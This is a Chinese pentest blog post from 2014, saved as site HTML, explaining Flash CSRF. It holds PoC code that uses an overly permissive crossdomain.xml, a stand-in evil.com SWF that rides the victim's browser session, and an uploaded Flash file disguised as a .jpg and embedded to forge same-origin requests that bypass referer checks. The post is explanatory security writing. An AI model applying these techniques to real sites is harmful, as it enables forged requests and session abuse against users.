@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>也来聊聊 Flash CSRF | Chu&#39;s BLoG</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="update 2014/06/04这篇文章里面的技巧非常 Nice~http://blog.detectify.com/post/86298380233/the-pitfalls-of-allowing-file-uploads-on-your-website
+
+看到 ping0s 在 FB 上放出了关于 Flash CSRF 的一些东西，也来聊一聊，just share.
+Flash CSRF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="也来聊聊 Flash CSRF">
+<meta property="og:url" content="http://sh3ll.me/2014/05/28/something-about-flash-csrf/index.html">
+<meta property="og:site_name" content="Chu's BLoG">
+<meta property="og:description" content="update 2014/06/04这篇文章里面的技巧非常 Nice~http://blog.detectify.com/post/86298380233/the-pitfalls-of-allowing-file-uploads-on-your-website
+
+看到 ping0s 在 FB 上放出了关于 Flash CSRF 的一些东西，也来聊一聊，just share.
+Flash CSRF">
+<meta property="og:image" content="http://sh3ll.me/images/2014/05/28/something-about-flash-csrf-1.png">
+<meta property="og:image" content="http://sh3ll.me/images/2014/05/28/something-about-flash-csrf-2.png">
+<meta property="og:updated_time" content="2016-07-16T09:12:50.038Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="也来聊聊 Flash CSRF">
+<meta name="twitter:description" content="update 2014/06/04这篇文章里面的技巧非常 Nice~http://blog.detectify.com/post/86298380233/the-pitfalls-of-allowing-file-uploads-on-your-website
+
+看到 ping0s 在 FB 上放出了关于 Flash CSRF 的一些东西，也来聊一聊，just share.
+Flash CSRF">
+<meta name="twitter:image" content="http://sh3ll.me/images/2014/05/28/something-about-flash-csrf-1.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Chu&#39;s BLoG" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link href="http://fonts.useso.com/css?family=Ubuntu" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  
+</head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Chu&#39;s BLoG</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Talk is cheap, show me the shell.</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="sub-nav">
+        
+          <a id="nav-home-icon" class="nav-icon" href="/"></a>
+        
+          <a id="nav-archives-icon" class="nav-icon" href="/archives"></a>
+        
+          <a id="nav-about-icon" class="nav-icon" href="/about"></a>
+        
+          <a id="nav-links-icon" class="nav-icon" href="/links"></a>
+        
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+      </nav>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-something-about-flash-csrf" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      也来聊聊 Flash CSRF
+    </h1>
+  
+
+      </header>
+    
+    <time class="article-date" datetime="2014-05-28T14:31:06.000Z" itemprop="datePublished">05-28-2014</time>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Pentest/">Pentest</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>update 2014/06/04<br>这篇文章里面的技巧非常 Nice~<br><a href="http://blog.detectify.com/post/86298380233/the-pitfalls-of-allowing-file-uploads-on-your-website" target="_blank" rel="external">http://blog.detectify.com/post/86298380233/the-pitfalls-of-allowing-file-uploads-on-your-website</a></p>
+<hr>
+<p>看到 ping0s 在 FB 上放出了关于 Flash CSRF 的一些东西，也来聊一聊，just share.</p>
+<p>Flash CSRF 通常是由于 crossdomain.xml 配置不当造成的，利用方法是使用 swf 文件跨域发起请求。当 crossdomain.xml 配置得当时，我们也可以从目标站点发起伪造请求。<br><a id="more"></a></p>
+<h2 id="crossdomain-xml-配置不当时直接请求"><a href="#crossdomain-xml-配置不当时直接请求" class="headerlink" title="crossdomain.xml 配置不当时直接请求"></a>crossdomain.xml 配置不当时直接请求</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</div><div class="line">&lt;cross-domain-policy&gt;</div><div class="line">    &lt;allow-access-from domain=&quot;*&quot; /&gt;</div><div class="line">&lt;/cross-domain-policy&gt;</div></pre></td></tr></table></figure>
+<p>上面的 crossdomain.xml 文件配置允任何域的 Flash 对本域发起 HTTP 请求，危害非常大。<br>hi.php:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    if ($_COOKIE[&apos;user&apos;]==&apos;admin&apos;) &#123;</div><div class="line">        echo &quot;hi, admin.&quot;;</div><div class="line">    &#125;</div><div class="line">    else &#123;</div><div class="line">        echo &quot;you need to login.&quot;;</div><div class="line">    &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>POC：<a href="http://evil.com/xss.swf?a=get&amp;c=http://localhost/hi.php" target="_blank" rel="external">http://evil.com/xss.swf?a=get&amp;c=http://localhost/hi.php</a> Firebug 下可以看到，我们成功继承浏览器会话，请求了 localhost 域的 hi.php</p>
+<p><img src="/images/2014/05/28/something-about-flash-csrf-1.png" alt="图 1"></p>
+<h2 id="crossdomain-xml-配置正确，从本域-Flash-发起请求"><a href="#crossdomain-xml-配置正确，从本域-Flash-发起请求" class="headerlink" title="crossdomain.xml 配置正确，从本域 Flash 发起请求"></a>crossdomain.xml 配置正确，从本域 Flash 发起请求</h2><p>重新配置crossdomain.xml，限制允许 localhost 域的 Flash 请求。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</div><div class="line">&lt;cross-domain-policy&gt;</div><div class="line">    &lt;allow-access-from domain=&quot;localhost&quot; /&gt;</div><div class="line">&lt;/cross-domain-policy&gt;</div></pre></td></tr></table></figure>
+<p>这时我们可以向目标站点上传 Flash 文件，通过 HTML 中的 object 和 embed 标签引用上传的 Flash 发起请求(注意，我们上传的文件不一定是 swf 后缀，和 script 标签类似，不一定要求是 js 后缀。)。POC:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;title&gt;FlashCSRF POC&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">    &lt;object classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; codebase=&quot;http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,0,0&quot; width=&quot;500&quot; height=&quot;500&quot; id=&quot;FlashVars&quot; align=&quot;middle&quot;/&gt;</div><div class="line">        &lt;paramname=&quot;allowScriptAccess&quot; value=&quot;always&quot;/&gt;</div><div class="line">        &lt;paramname=&quot;movie&quot; value=&quot;http://localhost/xss.jpg&quot; /&gt;</div><div class="line">        &lt;paramname=&quot;FlashVars&quot; value=&quot;a=get&amp;c=http://localhost/hi.php&quot;/&gt;</div><div class="line">        &lt;paramname=&quot;quality&quot; value=&quot;high&quot; /&gt;</div><div class="line">        &lt;embed src=&quot;http://localhost/xss.jpg&quot; quality=&quot;high&quot; bgcolor=&quot;#ffffff&quot; width=&quot;500&quot; height=&quot;500&quot; name=&quot;FlashVars&quot; align=&quot;middle&quot; allowScriptAccess=&quot;always&quot; FlashVars=&quot;a=get&amp;c=http://localhost/hi.php&quot; type=&quot;application/x-shockwave-flash&quot; pluginspage=&quot;http://www.macromedia.com/go/getflashplayer&quot;/&gt;</div><div class="line">    &lt;/object/&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
+<p><a href="http://evil.com/poc.html" target="_blank" rel="external">http://evil.com/poc.html</a></p>
+<p><img src="/images/2014/05/28/something-about-flash-csrf-2.png" alt="图 2"></p>
+<p>这里的 object 标签内嵌 embed 标签是为了兼容大多数浏览器。通过 Flash 从本域发起的请求可以绕过一些限制，如 referer 等。</p>
+<p>References：<br><a href="http://www.80sec.com/csrf-with-flash.html" target="_blank" rel="external">http://www.80sec.com/csrf-with-flash.html</a><br><a href="http://dushii.blog.163.com/blog/static/173051932009413104931351/" target="_blank" rel="external">http://dushii.blog.163.com/blog/static/173051932009413104931351/</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a href="http://sh3ll.me/2014/05/28/something-about-flash-csrf/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2014/06/18/python-requests-encoding/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Python + Requests 编码问题
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2014/04/28/web-for-pentester/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Web For Pentester 笔记</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<section id="comments">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2016 Chu<br>
+      <a href="https://github.com/steven5538/hexo-theme-athena" target="_blank">Athena</a> by <a href="http://steven5538.tw" target="_blank">Steven5538</a> | Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> | <script src="http://s11.cnzz.com/z_stat.php?id=1254610758&web_id=1254610758" language="JavaScript"></script>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+<script>
+  var disqus_shortname = 'sh3ll';
+  
+  var disqus_url = 'http://sh3ll.me/2014/05/28/something-about-flash-csrf/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//go.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+<script src="http://libs.baidu.com/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+  </div>
+</body>
+</html>
